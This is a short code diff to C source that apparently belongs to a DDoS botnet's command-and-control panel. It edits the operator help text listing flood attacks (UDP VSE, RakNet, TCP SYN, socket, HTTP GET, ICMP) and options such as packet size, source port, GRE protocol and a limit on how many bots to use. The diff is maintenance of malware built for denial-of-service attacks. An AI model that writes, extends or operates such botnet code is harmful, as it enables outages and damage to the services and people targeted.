@@ -56,7 +56,7 @@ void handle_attack_list_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              CYAN "!vse - UDP Game VSE Query Flood\r\n"
              "!raknet - RakNet UnConnectedPing flood\r\n"
-             "!syn - TCP SYN+PSH Flood\r\n"
+             "!syn - TCP SYN Flood\r\n"
              "!socket - TCP Stream Connections Flood\r\n"
              "!http - HTTP 1.1 GET Flood\r\n"
              "!icmp - ICMP ECHO Flood\r\n"
@@ -72,9 +72,9 @@ void handle_opthelp_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              RED "Optional Arguments:\r\n"
              "psize - packet size (max: 64500-ICMP-UDP-SYN | 1492 VSE-RakNet | 1450-UDPPLAIN | 8192-GRE)\r\n"
-             "srcport - srcport for UDP-SYN-GRE, Default=Random, max=65535)\r\n"
+             "srcport - UDP-SYN-GRE Default=Random max=65535\r\n"
              "botcount - Limit bots to use\r\n"
-             "proto - GRE Proto (tcp/udp) default=none\r\n"
+             "proto - GRE Proto (tcp/udp) default=IP_FLOOD\r\n"
              "gport - destport for GRE\r\n"
             );
              }
